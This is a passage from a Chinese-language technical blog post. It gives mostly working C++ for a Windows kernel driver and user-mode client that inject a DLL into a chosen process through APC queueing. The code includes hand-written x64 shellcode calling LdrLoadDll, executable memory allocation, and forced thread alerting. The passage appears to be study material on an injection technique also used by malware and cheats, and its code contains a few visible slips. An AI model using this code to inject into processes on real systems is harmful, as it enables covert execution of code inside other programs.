class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PINJECTION_DATA <span class="title">GetNativeCode</span><span class="params">(IN PVOID LdrLoadDll, IN PUNICODE_STRING DllFullPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">NTSTATUS Status = STATUS_SUCCESS;</span><br><span class="line">PINJECTION_DATA RemoteBufferData = <span class="literal">NULL</span>;</span><br><span class="line">SIZE_T RemoteBufferLength = PAGE_SIZE;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Code</span></span><br><span class="line">UCHAR ShellCode[] =</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xEC</span>, <span class="number">0x28</span>,                 <span class="comment">// sub rsp, 0x28</span></span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xC9</span>,                       <span class="comment">// xor rcx, rcx</span></span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xD2</span>,                       <span class="comment">// xor rdx, rdx</span></span><br><span class="line"><span class="number">0x49</span>, <span class="number">0xB8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,     <span class="comment">// mov r8, ModuleFileName   offset +12</span></span><br><span class="line"><span class="number">0x49</span>, <span class="number">0xB9</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,     <span class="comment">// mov r9, ModuleHandle     offset +28</span></span><br><span class="line"><span class="number">0x48</span>, <span class="number">0xB8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,     <span class="comment">// mov rax, LdrLoadDll      offset +32</span></span><br><span class="line"><span class="number">0xFF</span>, <span class="number">0xD0</span>,                             <span class="comment">// call rax</span></span><br><span class="line"><span class="number">0x48</span>, <span class="number">0xBA</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,     <span class="comment">// mov rdx, COMPLETE_OFFSET offset +44</span></span><br><span class="line"><span class="number">0xC7</span>, <span class="number">0x02</span>, <span class="number">0x7E</span>, <span class="number">0x1E</span>, <span class="number">0x37</span>, <span class="number">0xC0</span>,     <span class="comment">// mov [rdx], CALL_COMPLETE                  //APC使用</span></span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xC4</span>, <span class="number">0x28</span>,                 <span class="comment">// add rsp, 0x28</span></span><br><span class="line"><span class="number">0xC3</span>                                    <span class="comment">// ret</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Status = <span class="built_in">ZwAllocateVirtualMemory</span>(<span class="built_in">ZwCurrentProcess</span>(), &amp;RemoteBufferData, <span class="number">0</span>, &amp;RemoteBufferLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Copy path</span></span><br><span class="line">PUNICODE_STRING v1 = &amp;RemoteBufferData-&gt;DllFullPath;</span><br><span class="line">v1-&gt;Length = <span class="number">0</span>;</span><br><span class="line">v1-&gt;MaximumLength = <span class="built_in">sizeof</span>(RemoteBufferData-&gt;BufferData);</span><br><span class="line">v1-&gt;Buffer = RemoteBufferData-&gt;BufferData;</span><br><span class="line"></span><br><span class="line"><span class="built_in">RtlUnicodeStringCopy</span>(v1, DllFullPath);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Copy code</span></span><br><span class="line"><span class="built_in">memcpy</span>(RemoteBufferData-&gt;ShellCode, ShellCode, <span class="built_in">sizeof</span>(ShellCode));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Fill stubs</span></span><br><span class="line">*(ULONGLONG*)((PUCHAR)RemoteBufferData + <span class="number">12</span>) = (ULONGLONG)v1;</span><br><span class="line">*(ULONGLONG*)((PUCHAR)RemoteBufferData + <span class="number">22</span>) = (ULONGLONG)&amp;RemoteBufferData-&gt;ModuleBase;</span><br><span class="line">*(ULONGLONG*)((PUCHAR)RemoteBufferData + <span class="number">32</span>) = (ULONGLONG)LdrLoadDll;</span><br><span class="line">*(ULONGLONG*)((PUCHAR)RemoteBufferData + <span class="number">44</span>) = (ULONGLONG)&amp;RemoteBufferData-&gt;CallComplete;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> RemoteBufferData;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="开始APC注入"><a href="#开始APC注入" class="headerlink" title="开始APC注入"></a>开始APC注入</h4><ol><li>获取一个线程，取出EThread</li><li>插入线程的APC队列中</li><li>等待完成</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">ApcInjection</span><span class="params">(IN PINJECTION_DATA InjectionData, IN HANDLE TargetProcessID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//最后两个参数可以</span></span><br><span class="line">NTSTATUS Status = STATUS_SUCCESS;</span><br><span class="line">PETHREAD EThread = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取活跃线程（主线程）</span></span><br><span class="line">Status = <span class="built_in">SeLookupProcessThread</span>(TargetProcessID, &amp;EThread);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment">// 插入APC队列</span></span><br><span class="line">Status = <span class="built_in">SeQueueUserApc</span>(EThread, InjectionData, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, TRUE);  <span class="comment">//内核情景分析 358</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 等待完成</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(Status))   <span class="comment">//该代码待定</span></span><br><span class="line">&#123;</span><br><span class="line">LARGE_INTEGER Interval = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">Interval.QuadPart = -(<span class="number">5LL</span> * <span class="number">10</span> * <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 等待</span></span><br><span class="line"><span class="keyword">for</span> (ULONG i = <span class="number">0</span>; InjectionData-&gt;CallComplete != CALL_COMPLETE &amp;&amp; i &lt; <span class="number">10000</span>; i++)</span><br><span class="line"><span class="built_in">KeDelayExecutionThread</span>(KernelMode, FALSE, &amp;Interval);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">DbgPrint</span>(<span class="string">&quot;Failed To Locate Thread\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (EThread)</span><br><span class="line"><span class="built_in">ObDereferenceObject</span>(EThread);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="获取活跃线程"><a href="#获取活跃线程" class="headerlink" title="获取活跃线程"></a>获取活跃线程</h4><ol><li>获取进程的线程列表</li><li>过滤当前线程，并在SystemProcessInfo里取出一个线程ID获取EThread</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">SeLookupProcessThread</span><span class="params">(IN HANDLE ProcessID, OUT PETHREAD* EThread)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">NTSTATUS Status = STATUS_SUCCESS;</span><br><span class="line">PVOID BufferData = <span class="built_in">ExAllocatePool</span>(NonPagedPool, <span class="number">1024</span> * <span class="number">1024</span>);</span><br><span class="line">PSYSTEM_PROCESS_INFORMATION SystemProcessInfo = (PSYSTEM_PROCESS_INFORMATION)BufferData;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (EThread == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> STATUS_INVALID_PARAMETER;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!SystemProcessInfo)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DbgPrint</span>(<span class="string">&quot;Failed To Allocate Memory For Process List\r\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> STATUS_NO_MEMORY;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取进程的线程列表</span></span><br><span class="line">Status = <span class="built_in">ZwQuerySystemInformation</span>(SystemProcessInformation, SystemProcessInfo, <span class="number">1024</span> * <span class="number">1024</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">ExFreePool</span>(BufferData);</span><br><span class="line"><span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 找到目标线程</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">&#123;</span><br><span class="line">Status = STATUS_NOT_FOUND;</span><br><span class="line"><span class="keyword">for</span> (;;)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (SystemProcessInfo-&gt;UniqueProcessId == ProcessID)</span><br><span class="line">&#123;</span><br><span class="line">Status = STATUS_SUCCESS;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (SystemProcessInfo-&gt;NextEntryOffset)</span><br><span class="line">SystemProcessInfo = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)SystemProcessInfo + SystemProcessInfo-&gt;NextEntryOffset);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">&#123;</span><br><span class="line">Status = STATUS_NOT_FOUND;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; SystemProcessInfo-&gt;NumberOfThreads; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 跳过当前线程</span></span><br><span class="line"><span class="keyword">if</span> (</span><br><span class="line">SystemProcessInfo-&gt;Threads[i].ClientId.UniqueThread == <span class="built_in">PsGetCurrentThread</span>())</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 线程ID获取EThread</span></span><br><span class="line">Status = <span class="built_in">PsLookupThreadByThreadId</span>(SystemProcessInfo-&gt;Threads[i].ClientId.UniqueThread, EThread);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">DbgPrint</span>(<span class="string">&quot;Failed To Locate Process\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (BufferData)</span><br><span class="line"><span class="built_in">ExFreePool</span>(BufferData);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="插入目标线程APC队列"><a href="#插入目标线程APC队列" class="headerlink" title="插入目标线程APC队列"></a>插入目标线程APC队列</h4><ol><li>分配APC内存</li><li>初始化APC并分配执行和结束回调例程。APC回调例程中可以设置强制唤醒。执行例程就是之前的ShellCode</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">SeQueueUserApc</span><span class="params">(IN PETHREAD EThread,IN PVOID StartRoutine,IN PVOID Argument1,IN PVOID Argument2,IN PVOID Argument3,</span></span></span><br><span class="line"><span class="params"><span class="function">IN BOOLEAN IsForce)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (EThread == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> STATUS_INVALID_PARAMETER;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 分配APC内存</span></span><br><span class="line">PKAPC PrepareApc = <span class="literal">NULL</span>;</span><br><span class="line">PKAPC ExcuteApc = <span class="built_in">ExAllocatePool</span>(NonPagedPool, <span class="built_in">sizeof</span>(KAPC));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ExcuteApc == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DbgPrint</span>(<span class="string">&quot;Failed To Allocate APC\r\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> STATUS_NO_MEMORY;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一般APC 初始化</span></span><br><span class="line"><span class="built_in">KeInitializeApc</span>(</span><br><span class="line">ExcuteApc, (PKTHREAD)EThread,</span><br><span class="line">OriginalApcEnvironment, &amp;KernelApcExcuteCallback,</span><br><span class="line"><span class="literal">NULL</span>, (PKNORMAL_ROUTINE)(ULONG_PTR)StartRoutine, UserMode, Argument1);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 强制APC 初始化</span></span><br><span class="line"><span class="keyword">if</span> (IsForce)</span><br><span class="line">&#123;</span><br><span class="line">PrepareApc = <span class="built_in">ExAllocatePool</span>(NonPagedPool, <span class="built_in">sizeof</span>(KAPC));</span><br><span class="line"><span class="built_in">KeInitializeApc</span>(</span><br><span class="line">PrepareApc, (PKTHREAD)EThread,</span><br><span class="line">OriginalApcEnvironment, &amp;KernelApcPrepareCallback,</span><br><span class="line"><span class="literal">NULL</span>, <span class="literal">NULL</span>, KernelMode, <span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 插入APC队列</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">KeInsertQueueApc</span>(ExcuteApc, Argument2, Argument3, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (IsForce &amp;&amp; PrepareApc)</span><br><span class="line"><span class="built_in">KeInsertQueueApc</span>(PrepareApc, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DbgPrint</span>(<span class="string">&quot;Failed To Insert APC\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">ExFreePool</span>(ExcuteApc);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (PrepareApc)</span><br><span class="line"><span class="built_in">ExFreePool</span>(ExcuteApc);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> STATUS_NOT_CAPABLE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="APC完成回调例程"><a href="#APC完成回调例程" class="headerlink" title="APC完成回调例程"></a>APC完成回调例程</h4><p>一般情况</p><p>释放结构</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">KernelApcExcuteCallback</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">PKAPC Apc,</span></span></span><br><span class="line"><span class="params"><span class="function">PKNORMAL_ROUTINE* NormalRoutine,</span></span></span><br><span class="line"><span class="params"><span class="function">PVOID* NormalContext,</span></span></span><br><span class="line"><span class="params"><span class="function">PVOID* SystemArgument1,</span></span></span><br><span class="line"><span class="params"><span class="function">PVOID* SystemArgument2</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">UNREFERENCED_PARAMETER</span>(SystemArgument1);</span><br><span class="line"><span class="built_in">UNREFERENCED_PARAMETER</span>(SystemArgument2);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 当前线程正在被释放</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">PsIsThreadTerminating</span>(<span class="built_in">PsGetCurrentThread</span>()))</span><br><span class="line">*NormalRoutine = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 适配WOW64</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">PsGetCurrentProcessWow64Process</span>() != <span class="literal">NULL</span>)</span><br><span class="line"><span class="built_in">PsWrapApcWow64Thread</span>(NormalContext, (PVOID*)NormalRoutine);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放APC结构</span></span><br><span class="line"><span class="built_in">ExFreePool</span>(Apc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>强制情况</p><p>强行唤醒线程执行APC，释放结构</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">KernelApcPrepareCallback</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">PKAPC Apc,</span></span></span><br><span class="line"><span class="params"><span class="function">PKNORMAL_ROUTINE* NormalRoutine,</span></span></span><br><span class="line"><span class="params"><span class="function">PVOID* NormalContext,</span></span></span><br><span class="line"><span class="params"><span class="function">PVOID* SystemArgument1,</span></span></span><br><span class="line"><span class="params"><span class="function">PVOID* SystemArgument2</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">UNREFERENCED_PARAMETER</span>(NormalRoutine);</span><br><span class="line"><span class="built_in">UNREFERENCED_PARAMETER</span>(NormalContext);</span><br><span class="line"><span class="built_in">UNREFERENCED_PARAMETER</span>(SystemArgument1);</span><br><span class="line"><span class="built_in">UNREFERENCED_PARAMETER</span>(SystemArgument2);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">KeTestAlertThread</span>(UserMode); <span class="comment">//向目标植入可提醒状态</span></span><br><span class="line"><span class="built_in">ExFreePool</span>(Apc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="驱动卸载"><a href="#驱动卸载" class="headerlink" title="驱动卸载"></a>驱动卸载</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT DriverObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">UNICODE_STRING  DeviceLinkName;</span><br><span class="line">PDEVICE_OBJECTv1 = <span class="literal">NULL</span>;</span><br><span class="line">PDEVICE_OBJECT  DeleteDeviceObject = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">RtlInitUnicodeString</span>(&amp;DeviceLinkName, DEVICE_LINK_NAME);</span><br><span class="line"><span class="built_in">IoDeleteSymbolicLink</span>(&amp;DeviceLinkName);</span><br><span class="line">DeleteDeviceObject = DriverObject-&gt;DeviceObject;</span><br><span class="line"><span class="keyword">while</span> (DeleteDeviceObject != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">v1 = DeleteDeviceObject-&gt;NextDevice;</span><br><span class="line"><span class="built_in">IoDeleteDevice</span>(DeleteDeviceObject);</span><br><span class="line">DeleteDeviceObject = v1;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Ring3"><a href="#Ring3" class="headerlink" title="Ring3"></a>Ring3</h3><h4 id="主函数外的入口"><a href="#主函数外的入口" class="headerlink" title="主函数外的入口"></a>主函数外的入口</h4><ol><li>输入进程ID</li><li>获取当前可执行文件的路径，并将DllName与路径拼接起来，得到完整的DLL路径</li><li>通过链接名打开设备对象</li><li>初始化结构，发送结构体和控制码</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE_LINK_NAME    <span class="string">L&quot;\\??\\APCInjectionLinkName&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CTL_APC_INJECTION \</span></span><br><span class="line"><span class="meta">CTL_CODE(FILE_DEVICE_UNKNOWN,0x830,METHOD_BUFFERED,FILE_ANY_ACCESS)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_INJECTION_INFORMATION_</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">wchar_t</span>     DllFullPath[MAX_PATH];<span class="comment">// 当前DLL完整路径</span></span><br><span class="line">ULONG       TargetProcessID;<span class="comment">// 目标进程ID</span></span><br><span class="line">UCHAR       IsUnlinkModule;  <span class="comment">// 是否卸载模块</span></span><br><span class="line">&#125;INJECTION_INFORMATION, *PINJECTION_INFORMATION;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">ApcInjection</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">NTSTATUS  Status;</span><br><span class="line">ULONG  TargetProcessID = <span class="number">0</span>;</span><br><span class="line">cin &gt;&gt; TargetProcessID;<span class="comment">// 输入进程ID</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">wchar_t</span>* DllName = <span class="string">L&quot;Dll.dll&quot;</span>;</span><br><span class="line">wstring DllFullPath;</span><br><span class="line"><span class="comment">// 获取当前可执行文件的路径，并将DllName与路径拼接起来，得到完整的DLL路径</span></span><br><span class="line">DllFullPath = <span class="built_in">GetExeDirectory</span>() + <span class="string">L&quot;\\&quot;</span> + DllName;   <span class="comment">//选择编译</span></span><br><span class="line">CControlDevice  Object;</span><br><span class="line"><span class="comment">// 打开设备对象</span></span><br><span class="line"><span class="keyword">if</span> (!Object.<span class="built_in">SeOpenDeviceObject</span>(DEVICE_LINK_NAME))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">INJECTION_INFORMATION InjectionInfo = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">InjectionInfo.TargetProcessID = TargetProcessID;</span><br><span class="line">InjectionInfo.IsUnlinkModule = TRUE;</span><br><span class="line"><span class="built_in">wcscpy_s</span>(InjectionInfo.DllFullPath, DllFullPath.<span class="built_in">c_str</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 发送INJECTION_INFORMATION结构体和控制码</span></span><br><span class="line">Status = Object.<span class="built_in">SeDeviceIoControl</span>(&amp;InjectionInfo,<span class="built_in">sizeof</span>(INJECTION_INFORMATION),CTL_APC_INJECTION);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;CTL_APC_INJECTION Error\r\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span 